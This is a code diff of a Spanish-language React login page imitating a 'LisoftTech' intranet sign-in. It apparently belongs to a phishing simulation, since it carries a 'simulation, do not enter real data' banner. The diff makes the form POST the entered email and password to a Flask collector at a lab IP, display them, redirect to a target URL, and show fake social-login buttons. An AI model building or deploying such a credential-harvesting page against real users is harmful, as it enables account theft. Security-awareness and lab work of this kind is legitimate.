@@ -12,27 +12,42 @@ export default function Login() {
   const [pwd, setPwd] = useState("");
   const [show, setShow] = useState(false);
   const [loading, setLoading] = useState(false);
-  const [mensaje, setMensaje] = useState(""); // NUEVO
+  const [mensaje, setMensaje] = useState("");
 
   const validEmail = useMemo(() => /[^@\s]+@[^@\s]+\.[^@\s]+/.test(email), [email]);
   const strongPwd  = useMemo(() => pwd.length >= 6, [pwd]);
   const disabled   = !validEmail || !strongPwd || loading;
 
-  const onSubmit = (e) => {
+  const onSubmit = async (e) => {
     e.preventDefault();
     if (!validEmail || !strongPwd) return;
     setLoading(true);
 
-    // Mostrar las credenciales en pantalla
-    setMensaje(`Usuario: ${email} | Clave: ${pwd}`);
+    try {
+      // 👉 Aquí se manda al backend Flask
+      const resp = await fetch("http://10.0.2.15:5000/login", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ email, password: pwd })
+      });
 
-    // Simula breve verificación y luego redirige
-    setTimeout(() => {
-      window.location.assign(TARGET_URL); 
-    }, 1500);
+      const data = await resp.json();
+      console.log("Respuesta del backend:", data);
+
+      setMensaje(`Usuario: ${email} | Clave: ${pwd}`);
+
+      setTimeout(() => {
+        window.location.assign(TARGET_URL);
+      }, 1000);
+    } catch (err) {
+      console.error("Error al enviar credenciales:", err);
+      setMensaje("❌ Error de conexión con el backend");
+    } finally {
+      setLoading(false);
+    }
   };
 
-  // estilos comunes para inputs Chakra v3
+  // estilos comunes
   const inputBase = {
     bg: "whiteAlpha.100",
     borderColor: "whiteAlpha.300",
@@ -43,179 +58,109 @@ export default function Login() {
   };
 
   const focusCyan = {
-    "&:focus": {
-      borderColor: "cyan.300",
-      boxShadow: "0 0 0 1px var(--chakra-colors-cyan-300)"
-    },
-    "&:focus-visible": {
-      outline: "none",
-      borderColor: "cyan.300",
-      boxShadow: "0 0 0 2px var(--chakra-colors-cyan-300)"
-    }
+    "&:focus": { borderColor: "cyan.300", boxShadow: "0 0 0 1px var(--chakra-colors-cyan-300)" },
+    "&:focus-visible": { outline: "none", borderColor: "cyan.300", boxShadow: "0 0 0 2px var(--chakra-colors-cyan-300)" }
   };
 
   const focusPurple = {
-    "&:focus": {
-      borderColor: "purple.300",
-      boxShadow: "0 0 0 1px var(--chakra-colors-purple-300)"
-    },
-    "&:focus-visible": {
-      outline: "none",
-      borderColor: "purple.300",
-      boxShadow: "0 0 0 2px var(--chakra-colors-purple-300)"
-    }
+    "&:focus": { borderColor: "purple.300", boxShadow: "0 0 0 1px var(--chakra-colors-purple-300)" },
+    "&:focus-visible": { outline: "none", borderColor: "purple.300", boxShadow: "0 0 0 2px var(--chakra-colors-purple-300)" }
   };
 
   return (
     <Flex position="relative" direction="column" gap={6}>
-      {/* Banner de advertencia visible */}
-      <Box
-        role="alert"
-        rounded="xl"
-        px={4}
-        py={3}
-        bg="yellow.300"
-        color="black"
-        fontWeight="semibold"
-        textAlign="center"
-        boxShadow="0 6px 20px rgba(0,0,0,.25)"
-      >
+      <Box role="alert" rounded="xl" px={4} py={3} bg="yellow.300" color="black"
+        fontWeight="semibold" textAlign="center" boxShadow="0 6px 20px rgba(0,0,0,.25)">
         ⚠️ SIMULACIÓN — NO INGRESE DATOS REALES
       </Box>
 
-      {/* Encabezado */}
       <VStack spacing={1} align="start">
         <Badge variant="solid" colorScheme="purple" borderRadius="full" px={3} py={1}>
           Acceso
         </Badge>
-        <Heading size="lg" lineHeight={1.1} color="white">
-          Bienvenido a LisoftTech
-        </Heading>
-        <Text color="gray.300" fontSize="sm">
-          Inicia sesión para continuar. INTRANET.
-        </Text>
+        <Heading size="lg" lineHeight={1.1} color="white">Bienvenido a LisoftTech</Heading>
+        <Text color="gray.300" fontSize="sm">Inicia sesión para continuar. INTRANET.</Text>
       </VStack>
 
-      {/* Tarjeta con borde degradado */}
       <Box p="1.5" rounded="2xl" bgGradient="linear(to-r, cyan.400, purple.400)" boxShadow="0 10px 30px rgba(0,0,0,.35)">
-        <Box
-          as="form"
-          onSubmit={onSubmit}
-          bg="rgba(17, 17, 27, 0.72)"
-          backdropFilter="blur(12px)"
-          border="1px solid"
-          borderColor="whiteAlpha.200"
-          rounded="xl"
-          p={{ base: 5, md: 6 }}
-        >
+        <Box as="form" onSubmit={onSubmit}
+          bg="rgba(17, 17, 27, 0.72)" backdropFilter="blur(12px)"
+          border="1px solid" borderColor="whiteAlpha.200" rounded="xl"
+          p={{ base: 5, md: 6 }}>
+          
           <VStack spacing={5} align="stretch">
             {/* Email */}
             <Box>
-              <Text as="label" htmlFor="email" fontSize="sm" mb={2} display="block" color="white">
-                Correo electrónico
-              </Text>
+              <Text as="label" htmlFor="email" fontSize="sm" mb={2} display="block" color="white">Correo electrónico</Text>
               <Box position="relative">
                 <Box position="absolute" left="12px" top="50%" transform="translateY(-50%)" color="cyan.300">
                   <Mail size={20} strokeWidth={2.2} />
                 </Box>
-                <Input
-                  id="email"
-                  type="email"
-                  value={email}
-                  onChange={(e) => setEmail(e.target.value)}
-                  placeholder="usuario@lisofttech.com"
-                  pl="44px"
+                <Input id="email" type="email" value={email} onChange={(e) => setEmail(e.target.value)}
+                  placeholder="usuario@lisofttech.com" pl="44px"
                   aria-invalid={email.length > 0 && !validEmail}
-                  aria-describedby="email-help"
-                  {...inputBase}
-                  sx={focusCyan}
-                />
+                  {...inputBase} sx={focusCyan} />
               </Box>
               {email.length > 0 && !validEmail && (
-                <Text id="email-help" color="red.200" fontSize="xs" mt={2}>
-                  Ingresa un correo válido
-                </Text>
+                <Text color="red.200" fontSize="xs" mt={2}>Ingresa un correo válido</Text>
               )}
             </Box>
 
             {/* Password */}
             <Box>
-              <Text as="label" htmlFor="password" fontSize="sm" mb={2} display="block" color="white">
-                Contraseña
-              </Text>
+              <Text as="label" htmlFor="password" fontSize="sm" mb={2} display="block" color="white">Contraseña</Text>
               <Box position="relative">
                 <Box position="absolute" left="12px" top="50%" transform="translateY(-50%)" color="purple.300">
                   <Lock size={20} strokeWidth={2.2} />
                 </Box>
-                <Input
-                  id="password"
-                  type={show ? "text" : "password"}
-                  value={pwd}
-                  onChange={(e) => setPwd(e.target.value)}
-                  placeholder="••••••••"
-                  pl="44px"
-                  pr="56px"
+                <Input id="password" type={show ? "text" : "password"} value={pwd} onChange={(e) => setPwd(e.target.value)}
+                  placeholder="••••••••" pl="44px" pr="56px"
                   aria-invalid={pwd.length > 0 && !strongPwd}
-                  aria-describedby="pwd-help"
-                  {...inputBase}
-                  sx={focusPurple}
-                />
-                <IconButton
-                  aria-label={show ? "Ocultar contraseña" : "Mostrar contraseña"}
+                  {...inputBase} sx={focusPurple} />
+                <IconButton aria-label={show ? "Ocultar contraseña" : "Mostrar contraseña"}
                   icon={show ? <EyeOff size={18} /> : <Eye size={18} />}
-                  size="sm"
-                  variant="ghost"
-                  onClick={() => setShow((s) => !s)}
-                  position="absolute"
-                  right="6px"
-                  top="50%"
-                  transform="translateY(-50%)"
-                  color="whiteAlpha.900"
-                  _hover={{ bg: "whiteAlpha.200" }}
-                />
+                  size="sm" variant="ghost" onClick={() => setShow((s) => !s)}
+                  position="absolute" right="6px" top="50%" transform="translateY(-50%)"
+                  color="whiteAlpha.900" _hover={{ bg: "whiteAlpha.200" }} />
               </Box>
               {pwd.length > 0 && !strongPwd && (
-                <Text id="pwd-help" color="red.200" fontSize="xs" mt={2}>
-                  Mínimo 6 caracteres
-                </Text>
+                <Text color="red.200" fontSize="xs" mt={2}>Mínimo 6 caracteres</Text>
               )}
             </Box>
 
             <HStack justify="space-between" align="center">
               <Box />
-              <Button variant="link" color="cyan.300" size="sm" _hover={{ color: "cyan.200" }}>
-                ¿Olvidaste tu contraseña?
-              </Button>
+              <Button variant="link" color="cyan.300" size="sm" _hover={{ color: "cyan.200" }}>¿Olvidaste tu contraseña?</Button>
             </HStack>
 
-            {/* Botón principal */}
-            <Button
-              type="submit"
-              isDisabled={disabled}
-              isLoading={loading}
-              loadingText="Redirigiendo…"
-              size="lg"
-              rounded="full"
-              fontWeight="extrabold"
-              letterSpacing=".2px"
-              color="white"
+            <Button type="submit" isDisabled={disabled} isLoading={loading}
+              loadingText="Redirigiendo…" size="lg" rounded="full" fontWeight="extrabold"
+              letterSpacing=".2px" color="white"
               bgGradient="linear(to-r, #22d3ee, #a78bfa)"
-              border="1px solid"
-              borderColor="whiteAlpha.400"
+              border="1px solid" borderColor="whiteAlpha.400"
               boxShadow="0 10px 24px rgba(34,211,238,.35), 0 10px 24px rgba(167,139,250,.25)"
               _hover={{ filter: "brightness(1.08)", transform: "translateY(-1px)" }}
-              _active={{ transform: "translateY(0px)" }}
-            >
+              _active={{ transform: "translateY(0px)" }}>
               Entrar
             </Button>
 
-            {/* Mostrar credenciales en pantalla */}
             {mensaje && (
-              <Text color="cyan.200" fontSize="sm" textAlign="center" mt={3}>
-                {mensaje}
-              </Text>
+              <Text color="cyan.200" fontSize="sm" textAlign="center" mt={3}>{mensaje}</Text>
             )}
 
+            {/* Social */}
+            <Box pt={1}>
+              <HStack my={4} align="center" color="whiteAlpha.700">
+                <Box flex="1" h="1px" bg="whiteAlpha.300" />
+                <Text fontSize="xs" px={3}>o continúa con</Text>
+                <Box flex="1" h="1px" bg="whiteAlpha.300" />
+              </HStack>
+              <HStack spacing={3}>
+                <BrandButton label="Google" icon={<GoogleSVG />} />
+                <BrandButton label="GitHub" icon={<GitHubSVG />} />
+                <BrandButton label="Microsoft" icon={<MicrosoftSVG />} />
+              </HStack>
+            </Box>
           </VStack>
         </Box>
       </Box>
@@ -223,24 +168,17 @@ export default function Login() {
   );
 }
 
-/* === Botón social (con icono real) === */
+/* === Botón social === */
 function BrandButton({ label, icon }) {
   return (
-    <Button
-      variant="solid"
-      bg="white"
-      color="black"
-      _hover={{ bg: "whiteAlpha.900" }}
-      rounded="xl"
-      flex="1 1 0"
-      leftIcon={<Box w="18px" h="18px">{icon}</Box>}
-    >
+    <Button variant="solid" bg="white" color="black" _hover={{ bg: "whiteAlpha.900" }}
+      rounded="xl" flex="1 1 0" leftIcon={<Box w="18px" h="18px">{icon}</Box>}>
       {label}
     </Button>
   );
 }
 
-/* === SVGs de marca (a color) === */
+/* === SVGs === */
 function GoogleSVG() {
   return (
     <svg viewBox="0 0 24 24">
